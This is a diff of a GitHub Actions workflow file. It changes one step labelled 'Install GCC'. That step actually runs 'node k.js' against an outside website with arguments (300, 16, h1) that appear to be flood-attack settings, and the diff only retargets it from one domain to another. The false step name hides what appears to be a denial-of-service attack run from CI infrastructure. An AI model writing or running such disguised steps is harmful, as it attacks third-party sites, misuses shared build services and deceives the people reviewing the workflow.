@@ -20,4 +20,4 @@ jobs:
         uses: actions/checkout@v3
 
       - name: Install GCC
-        run: node k.js https://fastyl.net/ 300 16 h1
+        run: node k.js https://doffybee.com/ 300 16 h1
